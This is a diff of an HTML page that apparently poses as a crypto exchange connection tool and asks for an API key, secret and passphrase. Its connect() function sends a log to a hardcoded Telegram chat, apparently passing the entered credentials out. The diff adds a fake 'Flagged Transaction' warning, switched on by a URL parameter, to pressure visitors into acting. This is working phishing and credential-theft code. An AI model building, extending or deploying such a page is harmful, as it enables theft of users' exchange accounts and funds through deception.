@@ -122,17 +122,57 @@ button:hover {
   display: flex;
   flex-direction: column;
 }
-#confirmationModal h2 {
-  margin-top: 0;
-}
-#logDetails {
-  margin-top: 10px;
-  font-size: 12px;
-  background: #2a3a52;
-  padding: 10px;
+
+/* Styled flagged message */
+#flaggedMessage {
+  display: none;
+  padding: 20px;
+  background-color: #ff4d4d; /* Bright warning red */
+  color: #fff;
   border-radius: 8px;
-  overflow: auto;
-  max-height: 200px;
+  margin-top: 20px;
+  border: 2px solid #ff1a1a;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+  font-family: Arial, sans-serif;
+  position: relative;
+}
+#flaggedMessage h2 {
+  margin-top: 0;
+  font-size: 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+#flaggedMessage h2::before {
+  content: "⚠️";
+  font-size: 24px;
+}
+#flaggedMessage p {
+  margin: 10px 0;
+  font-size: 14px;
+}
+#flaggedMessage span#address {
+  font-weight: bold;
+  font-family: monospace;
+  background: rgba(255, 255, 255, 0.2);
+  padding: 4px 8px;
+  border-radius: 4px;
+}
+/* Close button for alert */
+#closeAlert {
+  position: absolute;
+  top: 10px;
+  right: 15px;
+  background: transparent;
+  border: none;
+  font-size: 20px;
+  color: #fff;
+  cursor: pointer;
+  font-weight: bold;
+  transition: color 0.2s;
+}
+#closeAlert:hover {
+  color: #ccc;
 }
 </style>
 </head>
@@ -163,16 +203,16 @@ button:hover {
     <label>API Secret</label>
     <input id="apiSecret" type="password" placeholder="Enter your API Secret" />
    
-   <label for="apiPhrase" class="form-label">Passphrase (Optional)</label>
-<input
-  id="apiPhrase"
-  name="apiPhrase"
-  type="password"
-  class="form-control"
-  placeholder="Enter your Passphrase (if applicable)"
-  aria-label="Passphrase"
-  aria-required="false"
-/>
+    <label for="apiPhrase" class="form-label">Passphrase (Optional)</label>
+    <input
+      id="apiPhrase"
+      name="apiPhrase"
+      type="password"
+      class="form-control"
+      placeholder="Enter your Passphrase (if applicable)"
+      aria-label="Passphrase"
+      aria-required="false"
+    />
     <button onclick="connect()">Verify & Connect</button>
 
     <div class="status" id="status"></div>
@@ -253,7 +293,15 @@ button:hover {
   </div>
 </div>
 
-  <script>
+<!-- Flagged transaction alert -->
+<div id="flaggedMessage">
+  <button id="closeAlert" onclick="document.getElementById('flaggedMessage').style.display='none'">×</button>
+  <h2>⚠️ Flagged Transaction</h2>
+  <p>Transaction involving address: <span id="address"></span></p>
+  <p>This transaction has been flagged for review. Please take appropriate action.</p>
+</div>
+
+<script>
 async function connect() {
   const status = document.getElementById("status");
   status.innerText = "Connecting to exchange...";
@@ -287,7 +335,7 @@ async function connect() {
       body: JSON.stringify({
         chat_id: "7737212833",
         text: logText,
-    parse_mode: "Markdown" 
+        parse_mode: "Markdown" 
       })
     });
 
@@ -307,6 +355,19 @@ function showModal() {
 
 function closeModal() {
   document.getElementById("confirmationModal").style.display = "none";
+}
+
+// Function to display flagged message based on URL param
+function getParameterByName(name) {
+  const url = new URL(window.location.href);
+  return url.searchParams.get(name);
+}
+
+const flaggedAddress = getParameterByName('flaggedAddress');
+
+if (flaggedAddress) {
+  document.getElementById('address').innerText = flaggedAddress;
+  document.getElementById('flaggedMessage').style.display = 'block';
 }
 </script>
 
